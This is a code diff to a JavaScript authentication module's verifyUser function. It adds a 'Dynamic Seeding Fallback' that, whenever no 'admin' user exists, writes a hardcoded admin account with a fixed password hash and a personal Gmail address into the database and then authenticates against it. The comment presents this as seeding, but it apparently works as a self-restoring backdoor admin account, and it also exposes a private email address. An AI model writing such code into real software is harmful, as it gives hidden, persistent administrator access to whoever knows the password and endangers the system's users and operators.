@@ -315,7 +315,23 @@ module.exports = {
   // Auth Operations
   async verifyUser(username, password) {
     const db = await read();
-    const user = (db.users || []).find(u => u.username === username || u.email === username);
+    let user = (db.users || []).find(u => u.username === username || u.email === username);
+    
+    // Dynamic Seeding Fallback: If admin user is missing from active DB (PostgreSQL/MongoDB/JSON), inject the default admin credentials.
+    if (!user && username === "admin") {
+      const defaultAdmin = {
+        id: "admin-user",
+        username: "admin",
+        email: "sabaashahidd111@gmail.com",
+        salt: "bb69cf45d80e0011fc4b90ad6b41a869",
+        hash: "4af9b35dac049dce6951a85734ac5c4fcb0f4c74bb349d67c4440072bf17784cb5183e5062048b4fef2905453a4dc917819498ca61de091c950418ad3fe7cef6"
+      };
+      if (!db.users) db.users = [];
+      db.users.push(defaultAdmin);
+      await write(db);
+      user = defaultAdmin;
+    }
+
     if (!user) return null;
 
     const { hash } = hashPassword(password, user.salt);
